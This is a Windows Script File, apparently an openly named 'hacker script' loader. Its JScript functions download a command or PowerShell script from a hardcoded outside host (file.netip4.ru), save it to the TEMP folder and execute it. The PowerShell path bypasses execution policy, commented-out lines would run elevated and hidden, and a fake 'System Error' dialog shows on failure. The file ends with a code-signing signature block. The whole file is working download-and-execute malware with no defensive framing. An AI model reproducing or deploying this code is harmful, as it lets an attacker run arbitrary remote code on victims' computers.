<?xml version="1.0" encoding="Windows-1251"?>
<!-- ***************************** -->
<!-- File wsf -->
<!-- hackerscriptrepair01 -->
<!--
-->
<!-- ***************************** -->
<job id="ID1">
	<script language="JScript">
	<![CDATA[
	/* *********************************************************
	'
	' This Script Lib Downloads Exe File (with Archieve?) to
	' Temporary Directory and Runs it with Elevated Privileges
	'
	* *********************************************************/

/* *****************************************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getTempEnviron() {
	var fso, wsh, envProc, envSys;
	var strZlFolder; // Zlovred Temprorary Folder
	// Define ActiveX Objects
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Define System Environment Variable
	envSys = wsh.Environment;
	// Define Zlovred Temprorary Folder
	strZlFolder = "C:\\pub1\\Distrib\\Zlovred";
	// Define and Check Environment Variables
	var envVariable;
	envVariable = strZlFolder;
	if(!fso.FolderExists(envVariable)) {
		envVariable = envProc("TEMP");
		if(!fso.FolderExists(envVariable)) {
			envVariable = envSys("TMP");
			if(!fso.FolderExists(envVariable)) {
				envVariable = "";
			}
		}
	}
	return envVariable;
}

/******************************************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- If HTTP Response Not 200 (while is not make)
'
******************************************************************************/

function UploadFilesFromInt(strFile, strURL, strPath){
    var fso, xmlHttp, adoStream;
    // Define FileSystemObject
    fso = new ActiveXObject("Scripting.FileSystemObject");
    // Define XMLHTTP Help Object
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    // Define Adodb.Stream Object
    adoStream = new ActiveXObject("Adodb.Stream");
    var strFileURL;
    var strLocal_Path;
    var intUploadFilesFromInt;
    var blnExistRemoteFile;
    // Define Full Downloaded File URL
    strFileURL = strURL + strFile;
    // Define Full Local Path to be Downloaded
    strLocal_Path = strPath + "\\" + strFile;
	
    // Check if Path is Exist
    if(fso.FolderExists(strPath))
	intUploadFilesFromInt = 0;
    else
	intUploadFilesFromInt = 1;
	
    // Downloaded File
    // Open URL (Get Requiest)
    xmlHttp.Open( "GET", strFileURL, false );
    // Set User-Agent Header (for Safari Browser)
    xmlHttp.SetRequestHeader( "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
    // Send File from URL
    try {
        xmlHttp.Send();
	    if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
    	// If Send Request is Successful 
        	blnExistRemoteFile = true;
    	else
    	{
        	blnExistRemoteFile = false;
        	intUploadFilesFromInt = 2;
        	xmlHttp.Abort();
    	}
    }
    catch(err) {
        blnExistRemoteFile = false;
        intUploadFilesFromInt = 2;
        xmlHttp.Abort();
    }
    if( blnExistRemoteFile )
    {
        // Set AdoStream Type mode and Open It
        adoStream.Type = 1;
        adoStream.Mode = 3;
        adoStream.Open();
        // Write to AdoStream Response Body jf HTTP Request
        adoStream.Write(xmlHttp.responseBody);
        // Save Stream to File
        adoStream.SaveToFile( strLocal_Path, 2 );
	// /Downloaded File
	
	// Close Objects	
	adoStream.Close();
	xmlHttp.Abort();
	
	// Check If File Downloaded
	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
		intUploadFilesFromInt = 1;
	// /Check if File Downloaded
    }
    return intUploadFilesFromInt;
}

/******************************************************************************
'
' RunDownloadedCmd( strPath, strCmd, iTimeOut )
' This Function Run a strCmd Command File File
' with Command cmd /c "strPath & "\" & strVBS "
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'	`			1 if Path Not Found
'
******************************************************************************/

function RunDownloadedCmd(strPath, strCmd, intTimeOut ){
    var constOpt;
    // Define Command Options (Empty)
    constOpt = "";
    var preArgs; 	// Previously Arguments of cmd.exe
    preArgs = "/c ";
    var strValue, shApp, wsh, envProc, pathCMD, fso;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    //Define Command Path Variable
    envProc = wsh.Environment("PROCESS");
    pathCMD = envProc("SystemRoot") + "\\System32";
    // Set cmd.exe Command Arguments
    strValue = preArgs + "\"" + strPath + "\\" + strCmd + "\" " + constOpt;
    // Check If Path Exists
    if(!fso.FileExists(strPath + "\\" + strCmd )) return 1;
    if(!fso.FileExists(pathCMD + "\\cmd.exe")) return 1;
    // Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0 );
    // Run exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/* ********************************************************
'
' CmdDownlRun( strURL , strFileNameCMD, iTimeOut )
'
' This Script Downloads CMD file from strURL Path and
' Execute Hidden it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameCMD - Name of CMD File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function CmdDownlRun(strURL, strFileNameCMD, iTimeOut) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	// WScript.Echo( strFileNameCMD + "\n" + strURL + "\n" + tempFolder + "\n" + iTimeOut)
	iFlag = UploadFilesFromInt(strFileNameCMD, strURL, tempFolder);
	if(iFlag != 0) return 1;
	iFlag = RunDownloadedCmd(tempFolder, strFileNameCMD, iTimeOut);
	if(iFlag != 0) return 1;
	return 0;
}

/******************************************************************************
'
' RunDownloadedPwsh( strPath, strPwsh, intTimeOut )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/

function RunDownloadedPwsh(strPath, strPwsh, intTimeOut ){
    var constRun_Pwsh, constOpt;
    // Define Windows Scripts Options
    constRun_VBS = "-noprofile -ExecutionPolicy Bypass -command ";
    // Define VBS Script Options (Empty)
    constOpt = "";
    var strValue, shApp, fso, wsh, envProc, pathPwsh;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    pathPwsh = envProc("SystemRoot") + "\\System32\\WindowsPowerShell\\v1.0";
    // Check Paths
    if (!fso.FileExists(pathPwsh + "\\PowerShell.exe")) {return 1};
    if (!fso.FileExists(strPath + "\\" + strPwsh)) {return 1};
    // Set Cscript Command Arguments
    strValue = constRun_VBS +"\"" + strPath + "\\" + strPwsh + "\" " + constOpt;
    // Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( pathPwsh + "\\PowerShell.exe", strValue, strPath, "runas", 0 );
    // Run cscript.exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( pathPwsh + "\\PowerShell.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/* ********************************************************
'
' PwshDownlRun( strURL , strFileNamePwsh, iTimeOut )
'
' This Script Downloads Pwsh file from strURL Path and
' Execute Hidden it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNamePwsh - Name of Pwsh File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function PwshDownlRun(strURL, strFileNamePwsh, iTimeOut) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNamePwsh, strURL, tempFolder);
	if(iFlag != 0) return 1;
	iFlag = RunDownloadedPwsh(tempFolder, strFileNamePwsh, iTimeOut);
	if(iFlag != 0) return 1;
	return 0;
}

	]]>
	</script>
	<script language="JScript">
	<![CDATA[
	// Define Global Variables
	var runScript; // Short Execution File Name
	var constHackScriptOpt; // Arguments of Exe File
	var strHackLIBURL; // an Url that Script to be Downloaded

	var httppref001, httphost001, httpport001, dirbase001;
	// Test
	// runScript = "echo.bat";
	runScript = "run-CmdInDownloads.w10.cmd";
	// runScript = "echo.ps1";
	constHackLIBOpt = "";
	// Define URL Variables
	//
	httppref001 = "http";
	httphost001 = "file.netip4.ru";
	httpport001 = "80";
	dirbase001 = "/Exponenta/Distrib/LIB-CMD/";
	dirbase002 = "/Exponenta/Distrib/LIB-PWSH/";
	// Define Temporary Variables
	var strHackLIBURL, iTimeOut01;
	strHackLIBURL = httppref001 + "://" + httphost001 + ":" + httpport001 + dirbase001;
	// strHackLIBURL = httppref001 + "://" + httphost001 + ":" + httpport001 + dirbase002;
	iTimeOut01 = 30000; // Time Out bis 30 sec
	]]>
	</script>
	<script language="JScript">
	<![CDATA[
	/* *********************************************************
	 '
	 ' HackerScriptRun()
	 '
	 ' This Script will Run a Shell in the Downloads Folder
	 '
	 ' PARAMETERS:	NONE;
	 ' GLOBALS:	iTimeOut01 - Wait to End Execution of the File
	 '      	runScript - Name of Exe File
	 '		strHackLIBURL -
	 ' RETURNS:	0 if Success Download and Run
	 '		1 if Folder Already Exists
	 '		2 if Error Occur
	 '
	* *********************************************************/
	function HackerScriptRun() {
		var iFlag;
		// Define ActiveX Objects
		iFlag = CmdDownlRun(strHackLIBURL, runScript, iTimeOut01);
		// iFlag = PwshDownlRun(strHackLIBURL, runScript, iTimeOut01);
		if(iFlag == 1) return 2;
		else return 0;
	}
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
	Dim iFlag
	iFlag = HackerScriptRun()
	If iFlag = 2 Then
	MsgBox "Error Download and Execution File!", vbOkOnly Or vbCritical, "System Error"
	End If
	]]>
	</script>

<signature>
** SIG ** MIIJcwYJKoZIhvcNAQcCoIIJZDCCCWACAQExCzAJBgUr
** SIG ** DgMCGgUAMGcGCisGAQQBgjcCAQSgWTBXMDIGCisGAQQB
** SIG ** gjcCAR4wJAIBAQQQcAVhGs441BGiowAQS9NQkAIBAAIB
** SIG ** AAIBAAIBAAIBADAhMAkGBSsOAwIaBQAEFLlu4cN8ZsOR
** SIG ** PRNi90MBUg6VcRm/oIIHEjCCAzUwggKioAMCAQICEJkW
** SIG ** fLCelp6QTP4DmBoxgmYwCQYFKw4DAh0FADCBnzEjMCEG
** SIG ** A1UEAxMaTklUIENsYXNzIDMgRVYgU1NMIENBIC0gRzQx
** SIG ** MDAuBgNVBAsTJ05ldyBJbnRlcm5ldCBUZWNobm9sb2dp
** SIG ** ZXMgVHJ1c3QgTmV0d29yazEnMCUGA1UEChMeTmV3IElu
** SIG ** dGVybmV0IFRlY2hub2xvZ2llcyBJbmMuMRAwDgYDVQQH
** SIG ** EwdTYXJhdG92MQswCQYDVQQGEwJSVTAgFw0yMDA3MjAw
** SIG ** NjI4NDdaGA8yMTIwMDcyMDA2Mjg0NlowKTEnMCUGA1UE
** SIG ** AxMeTmV3IEludGVybmV0IFRlY2hub2xvZ2llcyBJbmMu
** SIG ** MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDQ1J5P
** SIG ** MxpU8hfBgsQdWlC7jaSI6gyoOXU9lIzlq8Th4EImJa6h
** SIG ** IwtRj1AsI7EtNToFY79mfbpGpwj5vOJuL4cOQCN6AH1k
** SIG ** FQ1dsvPFcInMaskHQbI4bbo2SdkssPEYBHpRnxmluCpA
** SIG ** n33Q2omE4fDqNkP/YTOJBmq97r4K8WIAcQIDAQABo4Hs
** SIG ** MIHpMA8GA1UdEwEB/wQFMAMCAQUwIAYDVR0EAQH/BBYw
** SIG ** FDAOMAwGCisGAQQBgjcCARYDAgeAMDAGCisGAQQBgjcC
** SIG ** AQoEIjAgoB6AHGh0dHA6Ly9hbnRpY3JpbWluYWxvbmxp
** SIG ** bmUucnUwHQYDVR0lBBYwFAYIKwYBBQUHAwMGCCqFAwUB
** SIG ** GAIPMGMGA1UdAQRcMFqAEGft9iXxljpcUsmwg9jyG2mh
** SIG ** NDAyMTAwLgYDVQQDEydWZXJpU2lnbiBDbGFzcyAzIENv
** SIG ** ZGUgU2lnbmluZyAyMDIwLTIgQ0GCEIgt5Q0CI8WGSSAx
** SIG ** xykMZP4wCQYFKw4DAh0FAAOBgQCl/jyH83QyUErLnc0o
** SIG ** 0/8gWzEvxlY64xmNe+rEE7B243/YIDUCGZBIOKSgcpzo
** SIG ** 9tMCgY1aG0FuMIBsb+VL4C/17ITyhOfMAy9fvQ9bXhBL
** SIG ** WJ7XZ/M+1s2QtkZu+5mVfsnfmWm1F4vWJu1Xs5h31q53
** SIG ** nR9j9BjbiBKR+ppGFDlAQzCCA9UwggLBoAMCAQICEIgt
** SIG ** 5Q0CI8WGSSAxxykMZP4wCQYFKw4DAh0FADAyMTAwLgYD
** SIG ** VQQDEydWZXJpU2lnbiBDbGFzcyAzIENvZGUgU2lnbmlu
** SIG ** ZyAyMDIwLTIgQ0EwIBcNMjAwNzIwMDYyNzM1WhgPMjEy
** SIG ** MDA3MjAwNjI3MzRaMIGfMSMwIQYDVQQDExpOSVQgQ2xh
** SIG ** c3MgMyBFViBTU0wgQ0EgLSBHNDEwMC4GA1UECxMnTmV3
** SIG ** IEludGVybmV0IFRlY2hub2xvZ2llcyBUcnVzdCBOZXR3
** SIG ** b3JrMScwJQYDVQQKEx5OZXcgSW50ZXJuZXQgVGVjaG5v
** SIG ** bG9naWVzIEluYy4xEDAOBgNVBAcTB1NhcmF0b3YxCzAJ
** SIG ** BgNVBAYTAlJVMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCB
** SIG ** iQKBgQCnV+ciVLV8TSoMuck7HvoRB4lrtVYL0aVgIrqH
** SIG ** ktNwNyHe7sFP9Xr111Eg5Jdvdw5CffEw1DpdrTknvSug
** SIG ** sh+thGtJEWgFpaGjusB+tIYx9SyDkdF7vL/4I/6k10BE
** SIG ** obWbe9iOMzCwuu7v8p3MuWbZ05Cn5YxGLLDpoiSKogMe
** SIG ** HQIDAQABo4IBATCB/jASBgNVHRMBAf8ECDAGAQH/AgEF
** SIG ** MCAGA1UdBAEB/wQWMBQwDjAMBgorBgEEAYI3AgEWAwIH
** SIG ** gDAwBgorBgEEAYI3AgEKBCIwIKAegBxodHRwOi8vYW50
** SIG ** aWNyaW1pbmFsb25saW5lLnJ1MDsGA1UdJQQ0MDIGCCsG
** SIG ** AQUFBwMBBggrBgEFBQcDAgYIKwYBBQUHAwMGCCsGAQUF
** SIG ** BwMEBggqhQMFARgCDzBXBgNVHQEEUDBOgBB4leuhVGrS
** SIG ** yZlKiPAsnoXwoTQwMjEwMC4GA1UEAxMnVmVyaVNpZ24g
** SIG ** Q2xhc3MgMyBDb2RlIFNpZ25pbmcgMjAyMC0yIENBggSy
** SIG ** LhlFMAkGBSsOAwIdBQADggEBAAHNhrK52O5Yaon4AcVr
** SIG ** ygKPdPQINAhPi4Y6iDb8PnXdZKxJloMhgLAhr2FGCObe
** SIG ** WkP/usGDEHOYVd2s/nO3+/c+GasvhwZRTBdHMAe5Eosi
** SIG ** eSy/b7DeJK15LtRi1m7VCDYHGBgZM2RA85thdIRo8SCx
** SIG ** +rg+7JGd6RCMSYpyXs5kmc/XZL5BjERrste009TJuI/o
** SIG ** IEa0VpNuPmyydkPcxSUyHaMXieos+xus/u4O9fMe66ZX
** SIG ** GDGWhno79a0/LXutmRxz7yCmnpGevSV9jpvLhXI1AIMw
** SIG ** TtOkUegE5t1uF90FF4suoXzh2VFb0o0ENF8WJ8mEvyDm
** SIG ** iVLQH+pY/mZ2OX8xggHNMIIByQIBATCBtDCBnzEjMCEG
** SIG ** A1UEAxMaTklUIENsYXNzIDMgRVYgU1NMIENBIC0gRzQx
** SIG ** MDAuBgNVBAsTJ05ldyBJbnRlcm5ldCBUZWNobm9sb2dp
** SIG ** ZXMgVHJ1c3QgTmV0d29yazEnMCUGA1UEChMeTmV3IElu
** SIG ** dGVybmV0IFRlY2hub2xvZ2llcyBJbmMuMRAwDgYDVQQH
** SIG ** EwdTYXJhdG92MQswCQYDVQQGEwJSVQIQmRZ8sJ6WnpBM
** SIG ** /gOYGjGCZjAJBgUrDgMCGgUAoHAwEAYKKwYBBAGCNwIB
** SIG ** DDECMAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQw
** SIG ** HAYKKwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARYwIwYJ
** SIG ** KoZIhvcNAQkEMRYEFNujUKyttS4is22cMDxy2arL2TXA
** SIG ** MA0GCSqGSIb3DQEBAQUABIGAcgSdZJzQvhV+6bLYQxQj
** SIG ** PjaUdRNDn1ApADqqnGreeUt4MGGFM5xFYmhecwBp1Jxq
** SIG ** 1KbPQRIF0uUG3sqUKoJfpZ2eQ+U5e2tAHhlJdfv9a/b/
** SIG ** OcKJ7x15/IZHPXmjfsyhBL2Iz7Eufz68hi8o8HeC4ksT
** SIG ** NtcoYLVCFvpOhzJtviw=
</signature>
</job>
